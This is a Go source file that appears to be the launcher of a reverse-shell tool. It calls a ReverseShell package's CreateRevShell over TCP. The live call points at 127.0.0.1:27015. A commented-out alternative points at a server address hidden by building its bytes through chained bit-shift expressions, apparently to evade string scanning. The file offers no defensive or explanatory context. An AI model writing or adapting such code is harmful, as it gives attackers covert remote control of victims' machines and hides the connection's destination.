package main

import(
  "ReverseShell"
  //"time"
  //"strings"
  "unsafe"
  //"fmt"
)

const (
	EAX = uint8(unsafe.Sizeof(true))
	ONE = "EAX"
)

func GetServerAddr() string{
  var str []byte
  str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX)
  str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX<<EAX|EAX))
  str = append(str, ((((EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX|EAX))
  str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX<<EAX|EAX))
  str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX<<EAX)
  str = append(str, (((EAX<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
  str = append(str, ((((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX|EAX))
  str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX)
  str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX)
  str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX<<EAX|EAX))
  str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
  str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX))
  str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX)
  str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX|EAX))
  str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX)
  str = append(str, (((EAX<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
  str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
  str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX|EAX))
  str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX)
  str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX)
  str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX)
  str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX))
  str = append(str, (EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX)
  str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX|EAX))
  str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX|EAX))
  return string(str)
}

func main(){
  //ReverseShell.CreateRevShell("tcp", GetServerAddr())
  ReverseShell.CreateRevShell("tcp", "127.0.0.1:27015")
  //time.Sleep(10 * time.Second)
  //ReverseShell.DestroyShell()
}
